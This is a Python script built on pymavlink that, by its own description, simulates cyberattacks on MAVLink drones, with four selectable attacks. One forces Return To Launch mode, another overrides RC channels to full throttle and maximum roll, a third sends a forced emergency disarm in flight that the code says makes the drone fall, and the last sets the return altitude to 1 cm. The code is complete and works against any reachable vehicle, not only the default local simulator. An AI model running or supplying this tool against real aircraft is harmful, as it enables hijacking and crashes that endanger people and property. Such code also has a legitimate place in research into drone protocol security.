import time
import argparse
from pymavlink import mavutil

def connect_vehicle(connection_string):
    print(f"Connecting to vehicle on: {connection_string}")
    vehicle = mavutil.mavlink_connection(connection_string)
    vehicle.wait_heartbeat()
    print(f"Target system: {vehicle.target_system}, Target component: {vehicle.target_component}")
    return vehicle

def attack_mode_change(vehicle):
    """
    Simulates a Command Injection Attack by forcing the drone into 'RTL' (Return To Launch) mode.
    This simulates an attacker hijacking the control to force the drone to land or return.
    """
    print("[ATTACK] Injecting malicious flight mode change (RTL)...")
    # Mode 6 is RTL for ArduCopter
    mode_id = vehicle.mode_mapping()['RTL']
    
    # Send MAV_CMD_DO_SET_MODE
    vehicle.mav.command_long_send(
        vehicle.target_system,
        vehicle.target_component,
        mavutil.mavlink.MAV_CMD_DO_SET_MODE,
        0, # confirmation
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        mode_id, 0, 0, 0, 0, 0
    )
    print("Malicious command sent!")

def attack_rc_override(vehicle, duration=10):
    """
    Simulates an RC Override Attack by injecting fake remote control inputs.
    This hijacks the drone's physical movement.
    """
    print(f"[ATTACK] Injecting malicious RC channel overrides for {duration} seconds...")
    start_time = time.time()
    
    # Overriding Channel 1 (Roll) to maximum right, Channel 3 (Throttle) to full
    while (time.time() - start_time) < duration:
        vehicle.mav.rc_channels_override_send(
            vehicle.target_system,
            vehicle.target_component,
            2000, # Ch1: Roll max
            1500, # Ch2: Pitch center
            2000, # Ch3: Throttle max
            1500, # Ch4: Yaw center
            0, 0, 0, 0 # Channels 5-8 unchanged
        )
        time.sleep(0.1) # Send at 10Hz
    
    # Release override
    vehicle.mav.rc_channels_override_send(
        vehicle.target_system, vehicle.target_component,
        0, 0, 0, 0, 0, 0, 0, 0
    )
    print("RC Override attack finished, control released.")

def attack_disarm(vehicle):
    """
    Simulates an Emergency Disarm Attack in mid-flight.
    This sends a command to cut the motors entirely.
    """
    print("[ATTACK] Injecting emergency motor disarm command...")
    vehicle.mav.command_long_send(
        vehicle.target_system,
        vehicle.target_component,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        0, # confirmation
        0, # 0 = disarm
        21196, # magic number for forced emergency disarm
        0, 0, 0, 0, 0
    )
    print("Disarm command sent! The drone should fall.")

def attack_param_change(vehicle):
    """
    Simulates a Parameter Sabotage Attack.
    Changes the RTL_ALT (Return To Launch Altitude) to 0 (crash risk) or modifies max speed.
    """
    print("[ATTACK] Injecting parameter sabotage (RTL_ALT = 1 cm)...")
    vehicle.mav.param_set_send(
        vehicle.target_system,
        vehicle.target_component,
        b'RTL_ALT',
        1, # 1 cm altitude
        mavutil.mavlink.MAV_PARAM_TYPE_REAL32
    )
    print("Parameter corrupted!")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Simulate MAVLink Cyberattacks')
    parser.add_argument('--connect', default='udp:127.0.0.1:14550', help='Vehicle connection string.')
    parser.add_argument('--attack', choices=['mode_change', 'rc_override', 'disarm', 'param_change'], required=True, help='Type of attack to execute.')
    args = parser.parse_args()
    
    vehicle = connect_vehicle(args.connect)
    
    if args.attack == 'mode_change':
        attack_mode_change(vehicle)
    elif args.attack == 'rc_override':
        attack_rc_override(vehicle)
    elif args.attack == 'disarm':
        attack_disarm(vehicle)
    elif args.attack == 'param_change':
        attack_param_change(vehicle)
